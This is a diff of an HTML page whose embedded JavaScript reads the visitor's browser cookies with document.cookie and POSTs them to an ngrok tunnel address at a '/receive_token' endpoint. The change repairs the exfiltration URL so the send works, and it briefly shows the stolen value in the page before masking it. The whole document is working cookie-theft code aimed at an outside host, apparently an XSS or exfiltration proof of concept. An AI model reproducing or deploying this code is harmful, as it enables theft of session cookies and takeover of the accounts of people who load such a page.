@@ -6,19 +6,29 @@
 </head>
 <body>
   <p>If you're seeing this, the script has already executed.</p>
+  <p>Cookie value: <span id="cookieValue"></span></p>
 
   <script type="text/javascript">
     // Function to send data to your server
     function sendData(data) {
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", "277f-85-191-43-72.ngrok-free.app", true);
+      xhr.open("POST", "https://277f-85-191-43-72.ngrok-free.app/receive_token", true);
       xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
       xhr.send(data);
     }
+    
     var cookieValue = document.cookie; // Get the cookie value
 
-    // Send the token and cookie to your server
-    sendData("token=" + encodeURIComponent(token) + "&cookie=" + encodeURIComponent(cookieValue));
+    // Display the cookie value in the DOM for demonstration purposes
+    document.getElementById('cookieValue').textContent = cookieValue;
+
+    // Send the cookie to your server
+    sendData("cookie=" + encodeURIComponent(cookieValue));
+
+    // Clear the cookie value from the DOM after a short delay
+    setTimeout(() => {
+      document.getElementById('cookieValue').textContent = '***';
+    }, 5000); // Clear after 5 seconds
   </script>
 
 </body>
